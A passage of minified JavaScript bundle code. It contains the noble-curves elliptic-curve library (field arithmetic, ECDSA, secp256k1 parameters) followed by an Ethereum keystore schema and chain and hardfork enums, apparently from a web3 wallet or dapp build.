                f = a.pow(l, n);
            for (; !a.eql(f, a.ONE);) {
                if (a.eql(f, a.ZERO)) return a.ZERO;
                let h = 1;
                for (let p = a.sqr(f); h < u && !a.eql(p, a.ONE); h++) p = a.sqr(p);
                const v = a.pow(c, Ue << BigInt(u - h - 1));
                c = a.sqr(v), d = a.mul(d, v), f = a.mul(f, c), u = h
            }
            return d
        }
    }

    function A6(e) {
        if (e % Bp === b6) {
            const t = (e + Ue) / Bp;
            return function(r, i) {
                const o = r.pow(i, t);
                if (!r.eql(r.sqr(o), i)) throw new Error("Cannot find square root");
                return o
            }
        }
        if (e % My === By) {
            const t = (e - By) / My;
            return function(r, i) {
                const o = r.mul(i, Ii),
                    s = r.pow(o, t),
                    a = r.mul(i, s),
                    l = r.mul(r.mul(a, Ii), s),
                    u = r.mul(a, r.sub(l, r.ONE));
                if (!r.eql(r.sqr(u), i)) throw new Error("Cannot find square root");
                return u
            }
        }
        return E6(e)
    }
    const _6 = ["create", "isValid", "is0", "neg", "inv", "sqrt", "sqr", "eql", "add", "sub", "mul", "pow", "div", "addN", "subN", "mulN", "sqrN"];

    function S6(e) {
        const t = {
                ORDER: "bigint",
                MASK: "bigint",
                BYTES: "isSafeInteger",
                BITS: "isSafeInteger"
            },
            n = _6.reduce((r, i) => (r[i] = "function", r), t);
        return ql(e, n)
    }

    function k6(e, t, n) {
        if (n < Xe) throw new Error("Expected power > 0");
        if (n === Xe) return e.ONE;
        if (n === Ue) return t;
        let r = e.ONE,
            i = t;
        for (; n > Xe;) n & Ue && (r = e.mul(r, i)), i = e.sqr(i), n >>= Ue;
        return r
    }

    function T6(e, t) {
        const n = new Array(t.length),
            r = t.reduce((o, s, a) => e.is0(s) ? o : (n[a] = o, e.mul(o, s)), e.ONE),
            i = e.inv(r);
        return t.reduceRight((o, s, a) => e.is0(s) ? o : (n[a] = e.mul(o, n[a]), e.mul(o, s)), i), n
    }

    function eA(e, t) {
        const n = t !== void 0 ? t : e.toString(2).length,
            r = Math.ceil(n / 8);
        return {
            nBitLength: n,
            nByteLength: r
        }
    }

    function I6(e, t, n = !1, r = {}) {
        if (e <= Xe) throw new Error(`Expected Field ORDER > 0, got ${e}`);
        const {
            nBitLength: i,
            nByteLength: o
        } = eA(e, t);
        if (o > 2048) throw new Error("Field lengths over 2048 bytes are not supported");
        const s = A6(e),
            a = Object.freeze({
                ORDER: e,
                BITS: i,
                BYTES: o,
                MASK: K0(i),
                ZERO: Xe,
                ONE: Ue,
                create: l => Pt(l, e),
                isValid: l => {
                    if (typeof l != "bigint") throw new Error(`Invalid field element: expected bigint, got ${typeof l}`);
                    return Xe <= l && l < e
                },
                is0: l => l === Xe,
                isOdd: l => (l & Ue) === Ue,
                neg: l => Pt(-l, e),
                eql: (l, u) => l === u,
                sqr: l => Pt(l * l, e),
                add: (l, u) => Pt(l + u, e),
                sub: (l, u) => Pt(l - u, e),
                mul: (l, u) => Pt(l * u, e),
                pow: (l, u) => k6(a, l, u),
                div: (l, u) => Pt(l * Mp(u, e), e),
                sqrN: l => l * l,
                addN: (l, u) => l + u,
                subN: (l, u) => l - u,
                mulN: (l, u) => l * u,
                inv: l => Mp(l, e),
                sqrt: r.sqrt || (l => s(a, l)),
                invertBatch: l => T6(a, l),
                cmov: (l, u, c) => c ? u : l,
                toBytes: l => n ? Q0(l, o) : Ss(l, o),
                fromBytes: l => {
                    if (l.length !== o) throw new Error(`Fp.fromBytes: expected ${o}, got ${l.length}`);
                    return n ? q0(l) : qi(l)
                }
            });
        return Object.freeze(a)
    }

    function tA(e) {
        if (typeof e != "bigint") throw new Error("field order must be bigint");
        const t = e.toString(2).length;
        return Math.ceil(t / 8)
    }

    function nA(e) {
        const t = tA(e);
        return t + Math.ceil(t / 2)
    }

    function C6(e, t, n = !1) {
        const r = e.length,
            i = tA(t),
            o = nA(t);
        if (r < 16 || r < o || r > 1024) throw new Error(`expected ${o}-1024 bytes of input, got ${r}`);
        const s = n ? qi(e) : q0(e),
            a = Pt(s, t - Ue) + Ue;
        return n ? Q0(a, i) : Ss(a, i)
    } /*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */
    const P6 = BigInt(0),
        ih = BigInt(1);

    function R6(e, t) {
        const n = (i, o) => {
                const s = o.negate();
                return i ? s : o
            },
            r = i => {
                const o = Math.ceil(t / i) + 1,
                    s = 2 ** (i - 1);
                return {
                    windows: o,
                    windowSize: s
                }
            };
        return {
            constTimeNegate: n,
            unsafeLadder(i, o) {
                let s = e.ZERO,
                    a = i;
                for (; o > P6;) o & ih && (s = s.add(a)), a = a.double(), o >>= ih;
                return s
            },
            precomputeWindow(i, o) {
                const {
                    windows: s,
                    windowSize: a
                } = r(o), l = [];
                let u = i,
                    c = u;
                for (let d = 0; d < s; d++) {
                    c = u, l.push(c);
                    for (let f = 1; f < a; f++) c = c.add(u), l.push(c);
                    u = c.double()
                }
                return l
            },
            wNAF(i, o, s) {
                const {
                    windows: a,
                    windowSize: l
                } = r(i);
                let u = e.ZERO,
                    c = e.BASE;
                const d = BigInt(2 ** i - 1),
                    f = 2 ** i,
                    h = BigInt(i);
                for (let v = 0; v < a; v++) {
                    const p = v * l;
                    let w = Number(s & d);
                    s >>= h, w > l && (w -= f, s += ih);
                    const m = p,
                        g = p + Math.abs(w) - 1,
                        y = v % 2 !== 0,
                        x = w < 0;
                    w === 0 ? c = c.add(n(y, o[m])) : u = u.add(n(x, o[g]))
                }
                return {
                    p: u,
                    f: c
                }
            },
            wNAFCached(i, o, s, a) {
                const l = i._WINDOW_SIZE || 1;
                let u = o.get(i);
                return u || (u = this.precomputeWindow(i, l), l !== 1 && o.set(i, a(u))), this.wNAF(l, u, s)
            }
        }
    }

    function rA(e) {
        return S6(e.Fp), ql(e, {
            n: "bigint",
            h: "bigint",
            Gx: "field",
            Gy: "field"
        }, {
            nBitLength: "isSafeInteger",
            nByteLength: "isSafeInteger"
        }), Object.freeze({ ...eA(e.n, e.nBitLength),
            ...e,
            p: e.Fp.ORDER
        })
    } /*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */
    function N6(e) {
        const t = rA(e);
        ql(t, {
            a: "field",
            b: "field"
        }, {
            allowedPrivateKeyLengths: "array",
            wrapPrivateKey: "boolean",
            isTorsionFree: "function",
            clearCofactor: "function",
            allowInfinityPoint: "boolean",
            fromBytes: "function",
            toBytes: "function"
        });
        const {
            endo: n,
            Fp: r,
            a: i
        } = t;
        if (n) {
            if (!r.eql(i, r.ZERO)) throw new Error("Endomorphism can only be defined for Koblitz curves that have a=0");
            if (typeof n != "object" || typeof n.beta != "bigint" || typeof n.splitScalar != "function") throw new Error("Expected endomorphism with beta: bigint and splitScalar: function")
        }
        return Object.freeze({ ...t
        })
    }
    const {
        bytesToNumberBE: B6,
        hexToBytes: M6
    } = w6, Fi = {
        Err: class extends Error {
            constructor(t = "") {
                super(t)
            }
        },
        _parseInt(e) {
            const {
                Err: t
            } = Fi;
            if (e.length < 2 || e[0] !== 2) throw new t("Invalid signature integer tag");
            const n = e[1],
                r = e.subarray(2, n + 2);
            if (!n || r.length !== n) throw new t("Invalid signature integer: wrong length");
            if (r[0] & 128) throw new t("Invalid signature integer: negative");
            if (r[0] === 0 && !(r[1] & 128)) throw new t("Invalid signature integer: unnecessary leading zero");
            return {
                d: B6(r),
                l: e.subarray(n + 2)
            }
        },
        toSig(e) {
            const {
                Err: t
            } = Fi, n = typeof e == "string" ? M6(e) : e;
            Wl(n);
            let r = n.length;
            if (r < 2 || n[0] != 48) throw new t("Invalid signature tag");
            if (n[1] !== r - 2) throw new t("Invalid signature: incorrect length");
            const {
                d: i,
                l: o
            } = Fi._parseInt(n.subarray(2)), {
                d: s,
                l: a
            } = Fi._parseInt(o);
            if (a.length) throw new t("Invalid signature: left bytes after parsing");
            return {
                r: i,
                s
            }
        },
        hexFromSig(e) {
            const t = u => Number.parseInt(u[0], 16) & 8 ? "00" + u : u,
                n = u => {
                    const c = u.toString(16);
                    return c.length & 1 ? `0${c}` : c
                },
                r = t(n(e.s)),
                i = t(n(e.r)),
                o = r.length / 2,
                s = i.length / 2,
                a = n(o),
                l = n(s);
            return `30${n(s+o+4)}02${l}${i}02${a}${r}`
        }
    }, dr = BigInt(0), rn = BigInt(1);
    BigInt(2);
    const Oy = BigInt(3);
    BigInt(4);

    function O6(e) {
        const t = N6(e),
            {
                Fp: n
            } = t,
            r = t.toBytes || ((v, p, w) => {
                const m = p.toAffine();
                return bl(Uint8Array.from([4]), n.toBytes(m.x), n.toBytes(m.y))
            }),
            i = t.fromBytes || (v => {
                const p = v.subarray(1),
                    w = n.fromBytes(p.subarray(0, n.BYTES)),
                    m = n.fromBytes(p.subarray(n.BYTES, 2 * n.BYTES));
                return {
                    x: w,
                    y: m
                }
            });

        function o(v) {
            const {
                a: p,
                b: w
            } = t, m = n.sqr(v), g = n.mul(m, v);
            return n.add(n.add(g, n.mul(v, p)), w)
        }
        if (!n.eql(n.sqr(t.Gy), o(t.Gx))) throw new Error("bad generator point: equation left != right");

        function s(v) {
            return typeof v == "bigint" && dr < v && v < t.n
        }

        function a(v) {
            if (!s(v)) throw new Error("Expected valid bigint: 0 < bigint < curve.n")
        }

        function l(v) {
            const {
                allowedPrivateKeyLengths: p,
                nByteLength: w,
                wrapPrivateKey: m,
                n: g
            } = t;
            if (p && typeof v != "bigint") {
                if (ho(v) && (v = As(v)), typeof v != "string" || !p.includes(v.length)) throw new Error("Invalid key");
                v = v.padStart(w * 2, "0")
            }
            let y;
            try {
                y = typeof v == "bigint" ? v : qi(yn("private key", v, w))
            } catch {
                throw new Error(`private key must be ${w} bytes, hex or bigint, not ${typeof v}`)
            }
            return m && (y = Pt(y, g)), a(y), y
        }
        const u = new Map;

        function c(v) {
            if (!(v instanceof d)) throw new Error("ProjectivePoint expected")
        }
        class d {
            constructor(p, w, m) {
                if (this.px = p, this.py = w, this.pz = m, p == null || !n.isValid(p)) throw new Error("x required");
                if (w == null || !n.isValid(w)) throw new Error("y required");
                if (m == null || !n.isValid(m)) throw new Error("z required")
            }
            static fromAffine(p) {
                const {
                    x: w,
                    y: m
                } = p || {};
                if (!p || !n.isValid(w) || !n.isValid(m)) throw new Error("invalid affine point");
                if (p instanceof d) throw new Error("projective point not allowed");
                const g = y => n.eql(y, n.ZERO);
                return g(w) && g(m) ? d.ZERO : new d(w, m, n.ONE)
            }
            get x() {
                return this.toAffine().x
            }
            get y() {
                return this.toAffine().y
            }
            static normalizeZ(p) {
                const w = n.invertBatch(p.map(m => m.pz));
                return p.map((m, g) => m.toAffine(w[g])).map(d.fromAffine)
            }
            static fromHex(p) {
                const w = d.fromAffine(i(yn("pointHex", p)));
                return w.assertValidity(), w
            }
            static fromPrivateKey(p) {
                return d.BASE.multiply(l(p))
            }
            _setWindowSize(p) {
                this._WINDOW_SIZE = p, u.delete(this)
            }
            assertValidity() {
                if (this.is0()) {
                    if (t.allowInfinityPoint && !n.is0(this.py)) return;
                    throw new Error("bad point: ZERO")
                }
                const {
                    x: p,
                    y: w
                } = this.toAffine();
                if (!n.isValid(p) || !n.isValid(w)) throw new Error("bad point: x or y not FE");
                const m = n.sqr(w),
                    g = o(p);
                if (!n.eql(m, g)) throw new Error("bad point: equation left != right");
                if (!this.isTorsionFree()) throw new Error("bad point: not in prime-order subgroup")
            }
            hasEvenY() {
                const {
                    y: p
                } = this.toAffine();
                if (n.isOdd) return !n.isOdd(p);
                throw new Error("Field doesn't support isOdd")
            }
            equals(p) {
                c(p);
                const {
                    px: w,
                    py: m,
                    pz: g
                } = this, {
                    px: y,
                    py: x,
                    pz: E
                } = p, k = n.eql(n.mul(w, E), n.mul(y, g)), I = n.eql(n.mul(m, E), n.mul(x, g));
                return k && I
            }
            negate() {
                return new d(this.px, n.neg(this.py), this.pz)
            }
            double() {
                const {
                    a: p,
                    b: w
                } = t, m = n.mul(w, Oy), {
                    px: g,
                    py: y,
                    pz: x
                } = this;
                let E = n.ZERO,
                    k = n.ZERO,
                    I = n.ZERO,
                    _ = n.mul(g, g),
                    L = n.mul(y, y),
                    C = n.mul(x, x),
                    M = n.mul(g, y);
                return M = n.add(M, M), I = n.mul(g, x), I = n.add(I, I), E = n.mul(p, I), k = n.mul(m, C), k = n.add(E, k), E = n.sub(L, k), k = n.add(L, k), k = n.mul(E, k), E = n.mul(M, E), I = n.mul(m, I), C = n.mul(p, C), M = n.sub(_, C), M = n.mul(p, M), M = n.add(M, I), I = n.add(_, _), _ = n.add(I, _), _ = n.add(_, C), _ = n.mul(_, M), k = n.add(k, _), C = n.mul(y, x), C = n.add(C, C), _ = n.mul(C, M), E = n.sub(E, _), I = n.mul(C, L), I = n.add(I, I), I = n.add(I, I), new d(E, k, I)
            }
            add(p) {
                c(p);
                const {
                    px: w,
                    py: m,
                    pz: g
                } = this, {
                    px: y,
                    py: x,
                    pz: E
                } = p;
                let k = n.ZERO,
                    I = n.ZERO,
                    _ = n.ZERO;
                const L = t.a,
                    C = n.mul(t.b, Oy);
                let M = n.mul(w, y),
                    F = n.mul(m, x),
                    U = n.mul(g, E),
                    Q = n.add(w, m),
                    A = n.add(y, x);
                Q = n.mul(Q, A), A = n.add(M, F), Q = n.sub(Q, A), A = n.add(w, g);
                let P = n.add(y, E);
                return A = n.mul(A, P), P = n.add(M, U), A = n.sub(A, P), P = n.add(m, g), k = n.add(x, E), P = n.mul(P, k), k = n.add(F, U), P = n.sub(P, k), _ = n.mul(L, A), k = n.mul(C, U), _ = n.add(k, _), k = n.sub(F, _), _ = n.add(F, _), I = n.mul(k, _), F = n.add(M, M), F = n.add(F, M), U = n.mul(L, U), A = n.mul(C, A), F = n.add(F, U), U = n.sub(M, U), U = n.mul(L, U), A = n.add(A, U), M = n.mul(F, A), I = n.add(I, M), M = n.mul(P, A), k = n.mul(Q, k), k = n.sub(k, M), M = n.mul(Q, F), _ = n.mul(P, _), _ = n.add(_, M), new d(k, I, _)
            }
            subtract(p) {
                return this.add(p.negate())
            }
            is0() {
                return this.equals(d.ZERO)
            }
            wNAF(p) {
                return h.wNAFCached(this, u, p, w => {
                    const m = n.invertBatch(w.map(g => g.pz));
                    return w.map((g, y) => g.toAffine(m[y])).map(d.fromAffine)
                })
            }
            multiplyUnsafe(p) {
                const w = d.ZERO;
                if (p === dr) return w;
                if (a(p), p === rn) return this;
                const {
                    endo: m
                } = t;
                if (!m) return h.unsafeLadder(this, p);
                let {
                    k1neg: g,
                    k1: y,
                    k2neg: x,
                    k2: E
                } = m.splitScalar(p), k = w, I = w, _ = this;
                for (; y > dr || E > dr;) y & rn && (k = k.add(_)), E & rn && (I = I.add(_)), _ = _.double(), y >>= rn, E >>= rn;
                return g && (k = k.negate()), x && (I = I.negate()), I = new d(n.mul(I.px, m.beta), I.py, I.pz), k.add(I)
            }
            multiply(p) {
                a(p);
                let w = p,
                    m, g;
                const {
                    endo: y
                } = t;
                if (y) {
                    const {
                        k1neg: x,
                        k1: E,
                        k2neg: k,
                        k2: I
                    } = y.splitScalar(w);
                    let {
                        p: _,
                        f: L
                    } = this.wNAF(E), {
                        p: C,
                        f: M
                    } = this.wNAF(I);
                    _ = h.constTimeNegate(x, _), C = h.constTimeNegate(k, C), C = new d(n.mul(C.px, y.beta), C.py, C.pz), m = _.add(C), g = L.add(M)
                } else {
                    const {
                        p: x,
                        f: E
                    } = this.wNAF(w);
                    m = x, g = E
                }
                return d.normalizeZ([m, g])[0]
            }
            multiplyAndAddUnsafe(p, w, m) {
                const g = d.BASE,
                    y = (E, k) => k === dr || k === rn || !E.equals(g) ? E.multiplyUnsafe(k) : E.multiply(k),
                    x = y(this, w).add(y(p, m));
                return x.is0() ? void 0 : x
            }
            toAffine(p) {
                const {
                    px: w,
                    py: m,
                    pz: g
                } = this, y = this.is0();
                p == null && (p = y ? n.ONE : n.inv(g));
                const x = n.mul(w, p),
                    E = n.mul(m, p),
                    k = n.mul(g, p);
                if (y) return {
                    x: n.ZERO,
                    y: n.ZERO
                };
                if (!n.eql(k, n.ONE)) throw new Error("invZ was invalid");
                return {
                    x,
                    y: E
                }
            }
            isTorsionFree() {
                const {
                    h: p,
                    isTorsionFree: w
                } = t;
                if (p === rn) return !0;
                if (w) return w(d, this);
                throw new Error("isTorsionFree() has not been declared for the elliptic curve")
            }
            clearCofactor() {
                const {
                    h: p,
                    clearCofactor: w
                } = t;
                return p === rn ? this : w ? w(d, this) : this.multiplyUnsafe(t.h)
            }
            toRawBytes(p = !0) {
                return this.assertValidity(), r(d, this, p)
            }
            toHex(p = !0) {
                return As(this.toRawBytes(p))
            }
        }
        d.BASE = new d(t.Gx, t.Gy, n.ONE), d.ZERO = new d(n.ZERO, n.ONE, n.ZERO);
        const f = t.nBitLength,
            h = R6(d, t.endo ? Math.ceil(f / 2) : f);
        return {
            CURVE: t,
            ProjectivePoint: d,
            normPrivateKeyToScalar: l,
            weierstrassEquation: o,
            isWithinCurveOrder: s
        }
    }

    function L6(e) {
        const t = rA(e);
        return ql(t, {
            hash: "hash",
            hmac: "function",
            randomBytes: "function"
        }, {
            bits2int: "function",
            bits2int_modN: "function",
            lowS: "boolean"
        }), Object.freeze({
            lowS: !0,
            ...t
        })
    }

    function F6(e) {
        const t = L6(e),
            {
                Fp: n,
                n: r
            } = t,
            i = n.BYTES + 1,
            o = 2 * n.BYTES + 1;

        function s(A) {
            return dr < A && A < n.ORDER
        }

        function a(A) {
            return Pt(A, r)
        }

        function l(A) {
            return Mp(A, r)
        }
        const {
            ProjectivePoint: u,
            normPrivateKeyToScalar: c,
            weierstrassEquation: d,
            isWithinCurveOrder: f
        } = O6({ ...t,
            toBytes(A, P, O) {
                const T = P.toAffine(),
                    B = n.toBytes(T.x),
                    R = bl;
                return O ? R(Uint8Array.from([P.hasEvenY() ? 2 : 3]), B) : R(Uint8Array.from([4]), B, n.toBytes(T.y))
            },
            fromBytes(A) {
                const P = A.length,
                    O = A[0],
                    T = A.subarray(1);
                if (P === i && (O === 2 || O === 3)) {
                    const B = qi(T);
                    if (!s(B)) throw new Error("Point is not on curve");
                    const R = d(B);
                    let $;
                    try {
                        $ = n.sqrt(R)
                    } catch (be) {
                        const ze = be instanceof Error ? ": " + be.message : "";
                        throw new Error("Point is not on curve" + ze)
                    }
                    const Z = ($ & rn) === rn;
                    return (O & 1) === 1 !== Z && ($ = n.neg($)), {
                        x: B,
                        y: $
                    }
                } else if (P === o && O === 4) {
                    const B = n.fromBytes(T.subarray(0, n.BYTES)),
                        R = n.fromBytes(T.subarray(n.BYTES, 2 * n.BYTES));
                    return {
                        x: B,
                        y: R
                    }
                } else throw new Error(`Point of length ${P} was invalid. Expected ${i} compressed bytes or ${o} uncompressed bytes`)
            }
        }), h = A => As(Ss(A, t.nByteLength));

        function v(A) {
            const P = r >> rn;
            return A > P
        }

        function p(A) {
            return v(A) ? a(-A) : A
        }
        const w = (A, P, O) => qi(A.slice(P, O));
        class m {
            constructor(P, O, T) {
                this.r = P, this.s = O, this.recovery = T, this.assertValidity()
            }
            static fromCompact(P) {
                const O = t.nByteLength;
                return P = yn("compactSignature", P, O * 2), new m(w(P, 0, O), w(P, O, 2 * O))
            }
            static fromDER(P) {
                const {
                    r: O,
                    s: T
                } = Fi.toSig(yn("DER", P));
                return new m(O, T)
            }
            assertValidity() {
                if (!f(this.r)) throw new Error("r must be 0 < r < CURVE.n");
                if (!f(this.s)) throw new Error("s must be 0 < s < CURVE.n")
            }
            addRecoveryBit(P) {
                return new m(this.r, this.s, P)
            }
            recoverPublicKey(P) {
                const {
                    r: O,
                    s: T,
                    recovery: B
                } = this, R = I(yn("msgHash", P));
                if (B == null || ![0, 1, 2, 3].includes(B)) throw new Error("recovery id invalid");
                const $ = B === 2 || B === 3 ? O + t.n : O;
                if ($ >= n.ORDER) throw new Error("recovery id 2 or 3 invalid");
                const Z = B & 1 ? "03" : "02",
                    ie = u.fromHex(Z + h($)),
                    be = l($),
                    ze = a(-R * be),
                    gt = a(T * be),
                    nt = u.BASE.multiplyAndAddUnsafe(ie, ze, gt);
                if (!nt) throw new Error("point at infinify");
                return nt.assertValidity(), nt
            }
            hasHighS() {
                return v(this.s)
            }
            normalizeS() {
                return this.hasHighS() ? new m(this.r, a(-this.s), this.recovery) : this
            }
            toDERRawBytes() {
                return _s(this.toDERHex())
            }
            toDERHex() {
                return Fi.hexFromSig({
                    r: this.r,
                    s: this.s
                })
            }
            toCompactRawBytes() {
                return _s(this.toCompactHex())
            }
            toCompactHex() {
                return h(this.r) + h(this.s)
            }
        }
        const g = {
            isValidPrivateKey(A) {
                try {
                    return c(A), !0
                } catch {
                    return !1
                }
            },
            normPrivateKeyToScalar: c,
            randomPrivateKey: () => {
                const A = nA(t.n);
                return C6(t.randomBytes(A), t.n)
            },
            precompute(A = 8, P = u.BASE) {
                return P._setWindowSize(A), P.multiply(BigInt(3)), P
            }
        };

        function y(A, P = !0) {
            return u.fromPrivateKey(A).toRawBytes(P)
        }

        function x(A) {
            const P = ho(A),
                O = typeof A == "string",
                T = (P || O) && A.length;
            return P ? T === i || T === o : O ? T === 2 * i || T === 2 * o : A instanceof u
        }

        function E(A, P, O = !0) {
            if (x(A)) throw new Error("first arg must be private key");
            if (!x(P)) throw new Error("second arg must be public key");
            return u.fromHex(P).multiply(c(A)).toRawBytes(O)
        }
        const k = t.bits2int || function(A) {
                const P = qi(A),
                    O = A.length * 8 - t.nBitLength;
                return O > 0 ? P >> BigInt(O) : P
            },
            I = t.bits2int_modN || function(A) {
                return a(k(A))
            },
            _ = K0(t.nBitLength);

        function L(A) {
            if (typeof A != "bigint") throw new Error("bigint expected");
            if (!(dr <= A && A < _)) throw new Error(`bigint expected < 2^${t.nBitLength}`);
            return Ss(A, t.nByteLength)
        }

        function C(A, P, O = M) {
            if (["recovered", "canonical"].some($t => $t in O)) throw new Error("sign() legacy options not supported");
            const {
                hash: T,
                randomBytes: B
            } = t;
            let {
                lowS: R,
                prehash: $,
                extraEntropy: Z
            } = O;
            R == null && (R = !0), A = yn("msgHash", A), $ && (A = yn("prehashed msgHash", T(A)));
            const ie = I(A),
                be = c(P),
                ze = [L(be), L(ie)];
            if (Z != null && Z !== !1) {
                const $t = Z === !0 ? B(n.BYTES) : Z;
                ze.push(yn("extraEntropy", $t))
            }
            const gt = bl(...ze),
                nt = ie;

            function Rr($t) {
                const wo = k($t);
                if (!f(wo)) return;
                const xg = l(wo),
                    bo = u.BASE.multiply(wo).toAffine(),
                    mn = a(bo.x);
                if (mn === dr) return;
                const xo = a(xg * a(nt + mn * be));
                if (xo === dr) return;
                let Eg = (bo.x === mn ? 0 : 2) | Number(bo.y & rn),
                    Ag = xo;
                return R && v(xo) && (Ag = p(xo), Eg ^= 1), new m(mn, Ag, Eg)
            }
            return {
                seed: gt,
                k2sig: Rr
            }
        }
        const M = {
                lowS: t.lowS,
                prehash: !1
            },
            F = {
                lowS: t.lowS,
                prehash: !1
            };

        function U(A, P, O = M) {
            const {
                seed: T,
                k2sig: B
            } = C(A, P, O), R = t;
            return XE(R.hash.outputLen, R.nByteLength, R.hmac)(T, B)
        }
        u.BASE._setWindowSize(8);

        function Q(A, P, O, T = F) {
            var bo;
            const B = A;
            if (P = yn("msgHash", P), O = yn("publicKey", O), "strict" in T) throw new Error("options.strict was renamed to lowS");
            const {
                lowS: R,
                prehash: $
            } = T;
            let Z, ie;
            try {
                if (typeof B == "string" || ho(B)) try {
                    Z = m.fromDER(B)
                } catch (mn) {
                    if (!(mn instanceof Fi.Err)) throw mn;
                    Z = m.fromCompact(B)
                } else if (typeof B == "object" && typeof B.r == "bigint" && typeof B.s == "bigint") {
                    const {
                        r: mn,
                        s: xo
                    } = B;
                    Z = new m(mn, xo)
                } else throw new Error("PARSE");
                ie = u.fromHex(O)
            } catch (mn) {
                if (mn.message === "PARSE") throw new Error("signature must be Signature instance, Uint8Array or hex string");
                return !1
            }
            if (R && Z.hasHighS()) return !1;
            $ && (P = t.hash(P));
            const {
                r: be,
                s: ze
            } = Z, gt = I(P), nt = l(ze), Rr = a(gt * nt), $t = a(be * nt), wo = (bo = u.BASE.multiplyAndAddUnsafe(ie, Rr, $t)) == null ? void 0 : bo.toAffine();
            return wo ? a(wo.x) === be : !1
        }
        return {
            CURVE: t,
            getPublicKey: y,
            getSharedSecret: E,
            sign: U,
            verify: Q,
            ProjectivePoint: u,
            Signature: m,
            utils: g
        }
    } /*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */
    function D6(e) {
        return {
            hash: e,
            hmac: (t, ...n) => G0(e, t, Ru(...n)),
            randomBytes: Jx
        }
    }

    function j6(e, t) {
        const n = r => F6({ ...e,
            ...D6(r)
        });
        return Object.freeze({ ...n(t),
            create: n
        })
    } /*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */
    const iA = BigInt("0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f"),
        Ly = BigInt("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141"),
        H6 = BigInt(1),
        Op = BigInt(2),
        Fy = (e, t) => (e + t / Op) / t;

    function $6(e) {
        const t = iA,
            n = BigInt(3),
            r = BigInt(6),
            i = BigInt(11),
            o = BigInt(22),
            s = BigInt(23),
            a = BigInt(44),
            l = BigInt(88),
            u = e * e * e % t,
            c = u * u * e % t,
            d = tn(c, n, t) * c % t,
            f = tn(d, n, t) * c % t,
            h = tn(f, Op, t) * u % t,
            v = tn(h, i, t) * h % t,
            p = tn(v, o, t) * v % t,
            w = tn(p, a, t) * p % t,
            m = tn(w, l, t) * w % t,
            g = tn(m, a, t) * p % t,
            y = tn(g, n, t) * c % t,
            x = tn(y, s, t) * v % t,
            E = tn(x, r, t) * u % t,
            k = tn(E, Op, t);
        if (!Lp.eql(Lp.sqr(k), e)) throw new Error("Cannot find square root");
        return k
    }
    const Lp = I6(iA, void 0, void 0, {
            sqrt: $6
        }),
        Z0 = j6({
            a: BigInt(0),
            b: BigInt(7),
            Fp: Lp,
            n: Ly,
            Gx: BigInt("55066263022277343669578718895168534326250603453777594175500187360389116729240"),
            Gy: BigInt("32670510020758816978083085130507043184471273380659243275938904335757337482424"),
            h: BigInt(1),
            lowS: !0,
            endo: {
                beta: BigInt("0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee"),
                splitScalar: e => {
                    const t = Ly,
                        n = BigInt("0x3086d221a7d46bcde86c90e49284eb15"),
                        r = -H6 * BigInt("0xe4437ed6010e88286f547fa90abfe4c3"),
                        i = BigInt("0x114ca50f7a8e2f3f657c1108d9d44cfd8"),
                        o = n,
                        s = BigInt("0x100000000000000000000000000000000"),
                        a = Fy(o * e, t),
                        l = Fy(-r * e, t);
                    let u = Pt(e - a * n - l * i, t),
                        c = Pt(-a * r - l * o, t);
                    const d = u > s,
                        f = c > s;
                    if (d && (u = t - u), f && (c = t - c), u > s || c > s) throw new Error("splitScalar: Endomorphism failed, k=" + e);
                    return {
                        k1neg: d,
                        k1: u,
                        k2neg: f,
                        k2: c
                    }
                }
            }
        }, nf);
    BigInt(0);
    Z0.ProjectivePoint;
    const U6 = Object.freeze(Object.defineProperty({
        __proto__: null,
        secp256k1: Z0
    }, Symbol.toStringTag, {
        value: "Module"
    }));
    var oh;
    const Ir = (oh = Z0) !== null && oh !== void 0 ? oh : U6,
        Dy = BigInt("0xffffffffffffffff"),
        xl = BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"),
        z6 = Ir.CURVE.n,
        G6 = z6 / BigInt(2),
        V6 = {
            type: "object",
            required: ["crypto", "id", "version", "address"],
            properties: {
                crypto: {
                    type: "object",
                    required: ["cipher", "ciphertext", "cipherparams", "kdf", "kdfparams", "mac"],
                    properties: {
                        cipher: {
                            type: "string"
                        },
                        ciphertext: {
                            type: "string"
                        },
                        cipherparams: {
                            type: "object"
                        },
                        kdf: {
                            type: "string"
                        },
                        kdfparams: {
                            type: "object"
                        },
                        salt: {
                            type: "string"
                        },
                        mac: {
                            type: "string"
                        }
                    }
                },
                id: {
                    type: "string"
                },
                version: {
                    type: "number"
                },
                address: {
                    type: "string"
                }
            }
        };
    var Ku;
    (function(e) {
        e[e.Mainnet = 1] = "Mainnet", e[e.Goerli = 5] = "Goerli", e[e.Sepolia = 11155111] = "Sepolia"
    })(Ku || (Ku = {}));
    var Se;
    (function(e) {
        e.Chainstart = "chainstart", e.Homestead = "homestead", e.Dao = "dao", e.TangerineWhistle = "tangerineWhistle", e.SpuriousDragon = "spuriousDragon", e.Byzantium = "byzantium", e.Constantinople = "constantinople", e.Petersburg = "petersburg", e.Istanbul = "istanbul", e.MuirGlacier = "muirGlacier", e.Berlin = "berlin", e.London = "london", e.ArrowGlacier = "arrowGlacier", e.GrayGlacier = "grayGlacier", e.MergeForkIdTransition = "mergeForkIdTransition", e.Merge = "merge", e.Shanghai = "shanghai", e.ShardingForkDev = "shardingFork"
    })(Se || (Se = {}));
    var jy;
    (function(e) {
        e.ProofOfStake = "pos", e.ProofOfWork = "pow", e.ProofOfAuthority = "poa"
    })(jy || (jy = {}));
    var Hy;
    (function(e) {
        e.Ethash = "ethash", e.Clique = "clique", e.Casper = "casper"
    })(Hy || (Hy = {}));
    var ct;
    (function(e) {
        e.PolygonMainnet = "polygon-mainnet", e.PolygonMumbai = "polygon-mumbai", e.ArbitrumRinkebyTestnet = "arbitrum-rinkeby-testnet", e.ArbitrumOne = "arbitrum-one", e.xDaiChain = "x-dai-chain", e.OptimisticKovan = "optimistic-kovan", e.OptimisticEthereum = "optimistic-ethereum"
    })(ct || (ct = {}));
    var cn;
    (function(e) {
